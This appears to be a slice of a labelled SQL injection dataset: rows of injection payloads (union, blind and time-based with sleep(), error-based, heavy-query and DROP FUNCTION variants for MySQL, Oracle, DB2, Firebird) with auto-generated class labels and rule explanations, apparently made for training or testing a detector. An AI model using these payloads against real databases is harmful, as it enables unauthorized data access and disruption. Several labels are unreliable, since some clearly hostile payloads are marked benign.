id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18161,"select * from users where id = 1 or 1#"", union select null,version ( ) -- 1",union_based,generic,0.95,"Token 'UNION SELECT' → union_based (priority 7); DB=generic. Payload contains: 'select * from users where id = 1 or 1#"", union select null,version ( ) -- 1'",3
18162,declare @s varchar ( 22 ) select @s =,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'declare @s varchar ( 22 ) select @s ='",3
18163,"select * from users where id = 1 or 1#"". union select version ( ) ,version ( ) -- 1",union_based,generic,0.95,"Token 'UNION SELECT' → union_based (priority 7); DB=generic. Payload contains: 'select * from users where id = 1 or 1#"". union select version ( ) ,version ( ) -'",3
18164,@variable,benign,generic,0.7,No injection tokens found in payload; treated as benign. Payload snippet: '@variable',3
18165,"select * from users where id = 1 or "" ( ) "" or 1 = 1 -- 1",boolean_blind,generic,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: 'select * from users where id = 1 or "" ( ) "" or 1 = 1 -- 1'",3
18166,"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",boolean_blind,generic,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: 'select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1'",3
18167,replace,benign,generic,0.7,No injection tokens found in payload; treated as benign. Payload snippet: 'replace',3
18168,* ( | ( objectclass = * ) ),benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: '* ( | ( objectclass = * ) )'",3
18169,limit,benign,generic,0.7,No injection tokens found in payload; treated as benign. Payload snippet: 'limit',3
18170,# from wapiti,benign,generic,0.5,UNCERTAIN: no recognized injection signals in payload snippet: '# from wapiti',2
18171,"1"" ) ) as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1"" ) ) as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a'",2
18172,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'gmil' = 'gmil",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,""",1
18173,"1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",boolean_blind,oracle,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=oracle via dual. Payload contains: ""1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x""",2
18174,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'fbsi' like 'fbsi",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( e""",2
18175,"1' in boolean mode ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: ""1' in boolean mode ) and 3707 = ( select count ( * ) from sysibm.systables as t1""",1
18176,"1%"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1%"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,a'",1
18177,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""pawh"" = ""pawh",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) '",1
18178,( 1589 = 1589 ) *1,benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: '( 1589 = 1589 ) *1'",3
18179,-5021'+ ( select yadq where 4285 = 4285 order by 1#,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""-5021'+ ( select yadq where 4285 = 4285 order by 1#""",3
18180,"1%' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1%' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( """,2
18181,if ( 8284 = 6171 ) select 8284 else drop function mbih--,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'if ( 8284 = 6171 ) select 8284 else drop function mbih--'",3
18182,"-7868"" ) ) or 9323 = 9323#",boolean_blind,generic,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: '-7868"" ) ) or 9323 = 9323#'",3
18183,"1"" where 2462 = 2462 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1"" where 2462 = 2462 and 2716 = ( select count ( * ) from sysusers as sys1,sysus'",1
18184,-7999 ) or 8422 = 1336,boolean_blind,generic,0.95,Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: '-7999 ) or 8422 = 1336',3
18185,"1 ) ) as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1 ) ) as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5 ) ) #'",3
18186,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'njnr' = 'njnr",boolean_blind,db2,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.sys'",3
18187,"end and ( ( ""rqay"" like ""rqay",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'end and ( ( ""rqay"" like ""rqay'",2
18188,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( '%' = '",boolean_blind,db2,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.sys'",3
18189,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142'",1
18190,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # zcyc",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers'",1
18191,"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2'",1
18192,if ( 8858 = 5680 ) select 8858 else drop function pyuo--,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'if ( 8858 = 5680 ) select 8858 else drop function pyuo--'",3
18193,"1 ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 1748 = 1748",error_based,mysql,0.9,"Token 'extractvalue()' → error_based (priority 4); DB=mysql via extractvalue/updatexml. Payload contains: '1 ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 500'",2
18194,"end and ( ""qkkn"" like ""qkkn",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'end and ( ""qkkn"" like ""qkkn'",2
18195,"1 ) where 6784 = 6784 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1 ) where 6784 = 6784 and elt ( 3114 = 3114,sleep ( 5 ) ) #'",3
18196,"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t""",1
18197,"1'|| ( select 'gboi' where 4191 = 4191 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: ""1'|| ( select 'gboi' where 4191 = 4191 and 8514 = ( select count ( * ) from doma""",1
18198,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'ejul' = 'ejul",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( """,2
18199,"1"" ) as paai where 4089 = 4089 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: '1"" ) as paai where 4089 = 4089 and 3707 = ( select count ( * ) from sysibm.systa'",1
18200,"1"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: '1"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #'",2
18201,1%' ) order by 1--,benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: ""1%' ) order by 1--""",3
18202,"end and ( ""vwbx"" = ""vwbx",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'end and ( ""vwbx"" = ""vwbx'",2
18203,"1' in boolean mode ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: ""1' in boolean mode ) and 8189 = ( select count ( * ) from sysibm.systables as t1""",1
18204,"-9087"" order by 1#",benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: '-9087"" order by 1#'",3
18205,1'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +',boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'+ ( select twyt where 3376 = 3376 and 7756 = dbms_utility.sqlid_to_sqlhash ( (""",3
18206,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""eevk"" = ""eevk",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: 'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""eevk"" = ""e'",1
18207,"1"" ) where 2136 = 2136 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=firebird via rdb$/gen_id. Payload contains: '1"" ) where 2136 = 2136 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$'",1
18208,1' ) where 7629 = 7629 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: ""1' ) where 7629 = 7629 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #""",3
18209,"1"" ) as duvm where 6190 = 6190 order by 1--",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '1"" ) as duvm where 6190 = 6190 order by 1--'",2
18210,"1'|| ( select 'bnaz' from dual where 7168 = 7168 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,oracle,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=oracle via dual. Payload contains: ""1'|| ( select 'bnaz' from dual where 7168 = 7168 and 2716 = ( select count ( * )""",1
18211,"-7686%"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '-7686%"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 en'",1
18212,"1' where 3612 = 3612 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' where 3612 = 3612 and ( select 9067 from ( select count ( * ) ,concat ( 0x717""",2
18213,"1 ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 8814 = 8814",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1 ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns '",1
18214,"-4785"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '-4785"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0'",1
18215,"1%' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( '%' = '",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1%' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( """,2
18216,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables '",3
18217,1'+ ( select 'ljtl' where 1766 = 1766,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'+ ( select 'ljtl' where 1766 = 1766""",3
18218,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'ytlf' = 'ytlf",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: ""1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 12""",2
18219,"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""cdnc"" like ""cdnc",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = '",2
18220,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'kwhs' like 'kwhs",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via elt/rlike. Payload contains: ""1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( """,2
18221,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'rhzy' = 'rhzy",boolean_blind,generic,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: ""1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysuser""",3
18222,"1'+ ( select 'sbvh' where 8539 = 8539 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: ""1'+ ( select 'sbvh' where 8539 = 8539 and 3707 = ( select count ( * ) from sysib""",1
18223,1'|| ( select 'uiyj' from dual where 8320 = 8320,boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'|| ( select 'uiyj' from dual where 8320 = 8320""",3
18224,"1 where 1096 = 1096 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1 where 1096 = 1096 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select'",2
18225,"-9011"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.5,"UNCERTAIN: no recognized injection signals in payload snippet: '-9011"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 e'",1
18226,"1 ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",heavy_query,firebird,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=firebird via rdb$/gen_id. Payload contains: '1 ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$co'",1
18227,"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""dppw"" like ""dppw",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3'",1
18228,1'|| ( select 'zyvk' from dual where 2072 = 2072,boolean_blind,oracle,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""1'|| ( select 'zyvk' from dual where 2072 = 2072""",3
18229,-6637' ) ) order by 1#,benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: ""-6637' ) ) order by 1#""",3
18230,"1' ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via sleep(). Payload contains: ""1' ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #""",2
18231,"1"" ) where 7010 = 7010 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=generic. Payload contains: '1"" ) where 7010 = 7010 and 9660 = ( select count ( * ) from all_users t1,all_use'",1
18232,1'|| ( select 'cclo' from dual where 6823 = 6823 and 9198 = 9198--,boolean_blind,oracle,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=oracle via dual. Payload contains: ""1'|| ( select 'cclo' from dual where 6823 = 6823 and 9198 = 9198--""",3
18233,"1%"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""%"" = """,heavy_query,db2,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=db2 via sysibm. Payload contains: '1%"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systa'",1
18234,"1'+ ( select 'zohk' where 5502 = 5502 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Token 'nested cross-join count' → heavy_query (priority 4); DB=firebird via rdb$/gen_id. Payload contains: ""1'+ ( select 'zohk' where 5502 = 5502 or 2367 = ( select count ( * ) from rdb$fi""",1
18235,"1%"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""%"" = """,boolean_blind,mysql,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=mysql via extractvalue/updatexml. Payload contains: '1%"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 ='",2
